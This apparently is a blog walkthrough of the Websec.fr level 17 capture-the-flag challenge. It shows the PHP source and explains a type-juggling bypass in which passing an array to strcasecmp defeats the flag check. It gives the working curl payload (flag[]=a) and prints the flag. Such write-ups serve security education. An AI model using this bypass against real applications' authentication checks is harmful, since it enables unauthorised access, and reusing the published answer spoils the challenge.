+++
title = 'Websec.fr Level 17'
date = '2025-12-10T00:00:00+01:00'
draft = false
tags = ['websec']
+++


![alt text](</images/stc/Level Seventeen.png>)

The code of [level17](http://websec.fr/level17/index.php) is [here](http://websec.fr/level17/source.php).

```php
 <?php
include "flag.php";

function sleep_rand() { /* I wish php5 had random_int() */
        $range = 100000;
        $bytes = (int) (log($range, 2) / 8) + 1;
        do {  /* Side effect: more random cpu cycles wasted ;) */
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        } while ($rnd >= $range);
        usleep($rnd);
}
?>
<!DOCTYPE html>
<html>
.......
                        <?php
                        if (isset ($_POST['flag'])):
                            sleep_rand(); /* This makes timing-attack impractical. */
                        ?>
            <br>
                        <div class="container">
                            <div class="row">
                                <?php
                                if (! strcasecmp ($_POST['flag'], $flag))
                                    echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
                                else
                                    echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
                                ?>
                            </div>
                        </div>
                        <?php endif ?>
........
</html>
```

After reading the code we can directly avoid a first part of php code because it's impossible to break this function.  
But in second part the only things who can conduct to a vulnerability is `strcasecmp`, so this function check if the `string` given in field is same that a **flag**.  
Reading [strcasecmp php documentation](https://www.php.net/manual/fr/function.strcasecmp.php) we can read that : 

```md
Returns a value less than 0 if string1 is less than string2; a value greater than 0 if string1 is greater than string2, and 0 if they are equal. 
```
So this vulnerability look like type jungling, we just have to help the strcasecmp to return `0` or `true` for exfiltrate the **flag**.  
After any research i read this [article](https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html) who explain exactly what i want , if we compare a strings with another type of value like **array** `strcasecmp` return `0`.


Using devtools in `network section` i send a `POST` request and **copy value as** `Curl` and modify it.


```bash
tedsig42@exegol:~# curl 'http://websec.fr/level17/index.php' -X POST  --data-raw 'flag[]=a&submit=Go'
<!DOCTYPE html>
<html>
................
                                <div class="alert alert-success">Here is your flag: <mark>WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}</mark>.</div>                            </div>
...............
</html>
```

Flag : `WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}`